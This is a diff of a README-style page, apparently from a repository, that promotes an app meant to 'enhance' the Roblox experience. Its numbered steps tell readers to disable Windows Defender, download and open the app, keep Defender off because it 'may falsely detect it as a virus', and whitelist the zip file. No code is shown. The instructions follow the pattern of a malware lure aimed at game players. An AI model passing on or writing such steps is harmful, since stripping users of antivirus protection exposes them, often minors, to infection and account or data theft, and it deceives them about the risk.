@@ -3,8 +3,12 @@ Hello! I'd like to introduce you to my app designed to enhance your Roblox exper
 
 Steps:
 
-Disable Windows Defender.
-Download the app.
-Open the app.
-And you're done! Give it a try and enjoy an elevated Roblox experience!
-By the way, remember to disable Windows Defender when using it, as it may falsely detect it as a virus.
+1 Disable Windows Defender.
+
+2 Download the app.
+
+3 Open the app.
+
+4 And you're done! Give it a try and enjoy an elevated Roblox experience!
+
+5 By the way, remember to disable Windows Defender when using it, as it may falsely detect it as a virus. also whitelist the zip file on windows defender as you may get errors.
